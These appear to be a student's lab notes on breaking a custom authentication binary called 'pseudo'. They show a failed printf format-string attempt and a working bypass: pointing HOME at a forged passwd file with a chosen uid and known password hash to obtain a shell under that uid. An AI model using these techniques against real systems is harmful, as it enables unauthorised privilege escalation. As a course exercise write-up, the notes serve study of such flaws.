### Get Past Checking `passwd`
 - It checks for `HOME` in env to find `/etc/passwd`
 - By making a fake `/etc/passwd` in `~`, we can point the env variable to it to search it for valid username
```
>>> env -i HOME=/home/alexander.stevenson/a2/fake ./pseudo Yeetinn /bin/bash
ðŸ˜¸: Found passwd entry for 'Yeetinn' (2028)
Upon successful authentication, I shall execve into:
/bin/bash
password for Yeetinn:
```
 - This means that now we should be able to overwrite `euid[1] = 0` and `euid[0] = <uid of user to crack`
 - Do this by setting the username to whatever printf string vulnerability we need and updating `/etc/passwd`
**Two issues with this**:
```
>>> env -i HOME=/home/alexander.stevenson/a2/fake ./pseudo $'%p-%p-%p-%p-%p-%p-%p-%p' /bin/bash

ðŸ˜¿: No passwd entry for '0x8-0x7fffffffecc0-0xffffffff-0x`'
Segmentation fault (core dumped)
```
 - It is seg faulting
 - It prints the first 32 bytes of the username *after* string formatting into `username_` to check if it exists in the file

### What Worked
 - So once `passwd` is open and the correct user is found it prompts you for the password of that user, if correct it lets you exec the executable as that user ID
 - If you just make a user under any user ID with a password of your choosing, you can then use `psuedo` to check if your user exists, check your password, and then grant you a shell under that user ID
 - Script to find the sha256 hash of a password in `~/get_sha.c` (hardcoded to be `hello`)
```
// ~/fake/etc/passwd
FakeVladimirRootin:255:2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
// Password is "hello"
```
```
alexander.stevenson@mocha:~/a2$ env -i HOME=/home/alexander.stevenson/a2/fake pseudo FakeVladimirRootin /bin/bash
ðŸ˜¸: Found passwd entry for 'FakeVladimirRootin' (255)
Upon successful authentication, I shall execve into:
/bin/bash
password for FakeVladimirRootin:
Authenticated as FakeVladimirRootin (uid: 255)

### If we need to change the user:
 - Just change the `uid` present in the shell script from `255` to any of the other user uids
